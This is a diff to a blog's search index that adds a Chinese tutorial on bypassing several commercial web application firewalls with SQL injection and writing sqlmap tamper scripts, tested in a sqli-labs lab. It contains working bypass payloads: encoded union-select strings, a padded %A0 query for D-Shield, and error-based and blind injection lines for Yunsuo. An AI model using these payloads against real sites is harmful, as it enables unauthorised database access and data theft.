@@ -1,6 +1,76 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>如何编写自己的绕waf-tamper脚本</title>
+    <url>/2020/08/25/six/</url>
+    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe>
+
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><pre><code>之前在某个群里，看到有个师傅问云锁怎么绕，后来自己尝试bypass云锁的sql注入由此，有了一下的文章</code></pre><h4 id="过狗篇章"><a href="#过狗篇章" class="headerlink" title="过狗篇章"></a>过狗篇章</h4><p>测试环境：</p>
+<pre><code>wamp(php5.6+mysql5.7+apache)
+
+sqli-labs</code></pre><p>搭建好sqli-labs后启动安全狗</p>
+<p><img src="https://i.loli.net/2020/07/20/zS3M8bqVTQ6ZRuJ.png" alt="图片.png"></p>
+<p>ok，之后就是尝试构造绕过语句，安全狗还是挺好过的，我这里使用的换行符号绕过</p>
+<p>直接上payload：union+%0A%23aaa%0Aselect+1,2,3%20%23</p>
+<p><img src="https://i.loli.net/2020/07/20/MX2ldPsCTU1pujw.png" alt="图片.png"></p>
+<p>​    </p>
+<p>成功绕过，然后我们就可以基于此规则写出一个绕过安全狗的sqlmap的tamper</p>
+<p>先直接看成品</p>
+<p><img src="https://i.loli.net/2020/07/20/RyXQBeAEHhSZCVz.png" alt="图片.png"></p>
+<p>进行注入测试</p>
+<p><img src="https://i.loli.net/2020/07/20/u9LfWcbQw5E4xIk.png" alt="图片.png">)<img src="https://i.loli.net/2020/07/20/TA8h1LnQqSpWc43.png" alt="图片.png"></p>
+<p>关于tamper脚本，简单说明下就是，前面的我们不用动，那些基本就是写导入库已经必要的声明之类的，我们只需主要修改的就是tamper函数下面的payload这个变量。想要详细了解tamper编写的师傅可以去看看官方手册。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;payload.replace(&#39;1&#39;,&#39;2&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>在此代码里，第一个参数输入sql注入的原语句，第二个参数，改为我们绕过形式的语句就ok。</p>
+<p>(小提醒：sqlmap的sql注入语句一般都是为大写，所以在编写的时候注意下大小写问题)</p>
+<h4 id="过盾篇"><a href="#过盾篇" class="headerlink" title="过盾篇"></a>过盾篇</h4><pre><code>环境
+
+win server2008+php+sqliab+d_safe_2.1.5.4</code></pre><p><img src="https://i.loli.net/2020/07/21/26wPhrVQ3NIsZuR.png" alt="图片.png"></p>
+<p>运行正常。这里和过狗有些差别，因为d盾他过滤内联注释/<em>*/、/</em>!*/等，并且他也过滤了换行符等一些特殊符号，最后fuzz 出来发现 他只对%A0不敏感。</p>
+<p>先直接上payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php&#x2F;?id&#x3D;1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&#39;union%A0select@1,2,table_name+from+information_schema.TABLES+where+TABLE_SCHEMA+like+database()%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/07/21/ytTFRQ82vBLlUEi.png" alt="图片.png"></p>
+<p>这里说明一下，为什么会填充很多字符，理由就是 如果不填充，你在get类型下就算只输入一个单引号他都会拦截，(离谱)</p>
+<p><img src="https://i.loli.net/2020/07/21/fRP1ABTSezXjiJq.png" alt="图片.png"></p>
+<p>所以需要填充字符来绕过，并且他会拦截=号这里可以用like 代替问题不大</p>
+<p>编写tamper：</p>
+<pre><code>马赛克</code></pre><h4 id="360webscan篇："><a href="#360webscan篇：" class="headerlink" title="360webscan篇："></a>360webscan篇：</h4><p>测试环境：</p>
+<pre><code>wamp+sqliab</code></pre><p><img src="https://i.loli.net/2020/07/21/UPuRNkI8WZDEYsz.png" alt="图片.png"></p>
+<p>搭建成功</p>
+<p>这里我依旧是使用的换行符来进行绕过的，他和d盾一样禁用内联注释，只要出现就被拦，但是规则相比d盾简单些能用的特殊符号多些</p>
+<p>先想payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0Aunion%0Aselect-1,concat_ws(&#39;&#39;,table_name),3 from information_schema.TABLES where TABLE_SCHEMA&#x3D;database()%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/07/21/qED8cPXkgG1n9fa.png" alt="图片.png"></p>
+<p>绕过规则就是在每个函数前面加上%0a、%A0很简单的思路，编写tamper</p>
+<p>先看成品：</p>
+<p><img src="https://i.loli.net/2020/07/21/EZ74GoMmlxFSfta.png" alt="图片.png"></p>
+<p><img src="https://i.loli.net/2020/07/21/jApxrTulP3V7v2N.png" alt="图片.png"></p>
+<p>ok</p>
+<h4 id="过云锁"><a href="#过云锁" class="headerlink" title="过云锁"></a>过云锁</h4><p>测试环境:</p>
+<p>win server 2012+phpstudy+sqliab</p>
+<p>运行正常</p>
+<p><img src="https://i.loli.net/2020/07/22/vWEo2Rz7KLQIMbB.png" alt="图片.png"></p>
+<p>在测试的时候发现，他主要对于联合查询拦截的很敏感，但是相对对于其他的查询类型不怎么严格，</p>
+<p>先上payload来观察：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%26%26(&#96;updatexml&#96;(1,concat(0x3a,&quot;---&quot;,(select user&#x2F;**&#x2F;())),1))%23</span><br><span class="line">&#x2F;&#x2F;bool注入</span><br><span class="line">%7c%7c substr((select user&#x2F;**&#x2F;()),1,1)&#x3D;&quot;r&quot;%23</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2020/07/22/ikEgmx3lbfaVZn8.png" alt="图片.png"></p>
+<p><img src="https://i.loli.net/2020/07/22/PgMTK4WFkmRawjQ.png" alt="图片.png"></p>
+<p>所以我们可以针对他盲注和报错注入写tamper ，因为这样比较简单</p>
+<p>成品</p>
+<pre><code>![图片.png](https://xzfile.aliyuncs.com/media/upload/picture/20200819155846-cf26f36a-e1f1-1.png)</code></pre><p>看效果</p>
+<p><img src="https://i.loli.net/2020/07/22/9oK2FODV5Xxr8Nn.png" alt="图片.png"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><pre><code>waf 绕过，的方式主要还是根据不同waf 拦截的特性来的，根据不同的数据库特性，不同的系统，不同的中间件都有不同的绕过方式这里只是一个抛砖引玉的作用希望师傅们。d盾和云锁没有上tamper是因为，全发出来就没意思了，绕过方式已经给出来，编写就交给师傅们了。</code></pre>]]></content>
+      <tags>
+        <tag>技术讨论</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>实战记录</title>
     <url>/2020/07/19/five/</url>
     <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe> 
